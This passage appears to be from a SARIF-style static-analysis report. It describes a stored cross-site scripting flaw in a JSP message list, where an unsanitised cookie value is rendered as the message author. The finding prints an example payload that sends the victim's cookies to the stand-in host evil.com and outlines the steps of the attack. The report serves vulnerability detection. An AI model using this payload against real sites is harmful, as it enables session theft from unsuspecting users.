          "level": "error",
          "message": {
            "text": "The EL expression ${msg.author} on line 26 of list.jsp is rendered directly into the HTML body without encoding. The author field is taken from the user cookie value at message-post time (@CookieValue(value = \"user\", defaultValue = \"anonymous\") String user in MessageController.composeSubmit()). Since the user cookie is set to the raw username string with no sanitisation and no HttpOnly flag, an attacker can:\nRegister or set their user cookie to a value containing a JavaScript payload, e.g.:\n      <img src=x onerror=\"document.location='https://evil.com/?c='+document.cookie\">\n   \nSubmit a message. The payload is stored in the author column via the SQL INSERT.\nEvery user who subsequently loads the message list page receives and executes the stored script.\n\n${msg.timestamp} on the same line is server-generated and not directly attacker-controlled, but ${msg.author} is fully attacker-controlled.",
            "markdown": "The EL expression `${msg.author}` on line 26 of `list.jsp` is rendered directly into the HTML body without encoding. The `author` field is taken from the `user` cookie value at message-post time (`@CookieValue(value = \"user\", defaultValue = \"anonymous\") String user` in `MessageController.composeSubmit()`). Since the `user` cookie is set to the raw username string with no sanitisation and no `HttpOnly` flag, an attacker can:\n\n1. Register or set their `user` cookie to a value containing a JavaScript payload, e.g.:\n   ```\n   <img src=x onerror=\"document.location='https://evil.com/?c='+document.cookie\">\n   ```\n2. Submit a message. The payload is stored in the `author` column via the SQL `INSERT`.\n3. Every user who subsequently loads the message list page receives and executes the stored script.\n\n`${msg.timestamp}` on the same line is server-generated and not directly attacker-controlled, but `${msg.author}` is fully attacker-controlled."
          },
